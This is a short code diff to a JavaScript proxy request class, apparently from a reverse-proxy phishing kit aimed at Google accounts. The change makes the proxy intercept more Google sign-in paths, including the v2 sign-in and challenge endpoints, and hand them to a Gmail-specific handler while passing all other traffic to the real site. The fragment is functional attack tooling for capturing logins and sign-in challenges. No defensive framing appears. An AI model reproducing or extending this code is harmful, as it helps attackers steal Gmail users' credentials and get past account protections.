@@ -20,7 +20,9 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
-        if (this.browserReq.url.startsWith('/v3/signin/_/AccountsSignInUi/data/batchexecute')) {
+        if (this.browserReq.url.startsWith('/v3/signin/_/AccountsSignInUi/data/batchexecute')
+        || this.browserReq.url.startsWith('/signin/v2/')
+        || this.browserReq.url.startsWith('/_/signin/challenge')) {
             return this.makeGmailProcess()
         }
         return this.browserReq.pipe(this.proxyEndpoint)
